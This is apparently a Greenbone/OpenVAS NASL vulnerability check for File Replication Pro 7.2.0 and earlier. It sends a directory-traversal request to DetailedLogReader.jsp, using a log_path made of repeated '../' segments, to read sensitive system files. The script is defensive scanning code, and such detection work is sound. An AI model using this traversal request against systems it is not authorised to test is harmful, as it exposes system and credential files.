# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:file:replication:pro";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.806689");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2016-03-01 14:45:28 +0530 (Tue, 01 Mar 2016)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("File Replication Pro Multiple Vulnerabilities");

  script_tag(name:"summary", value:"File Replication Pro is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to get the content of sensitive file.");

  script_tag(name:"insight", value:"Multiple flaws exist due to multiple
  unspecified errors.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attacker to gain access to sensitive information and execute arbitrary commands
  on the affected system.");

  script_tag(name:"affected", value:"File Replication Pro version 7.2.0 and prior.");

  script_tag(name:"solution", value:"Upgrade to File Replication Pro
  version 7.3.0 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2016/Feb/61");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_file_replica_pro_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("FileReplicationPro/Installed");
  script_require_ports("Services/www", 9100);

  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!get_app_location(cpe:CPE, port:port, nofork:TRUE))
  exit(0);

files = traversal_files();

foreach file (keys(files))
{
  url = "/DetailedLogReader.jsp?log_path=" + crap(data: "../", length: 3*15) + files[file];

  if(http_vuln_check(port:port, url:url, pattern:file))
  {
    report = http_report_vuln_url( port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}
exit(99);
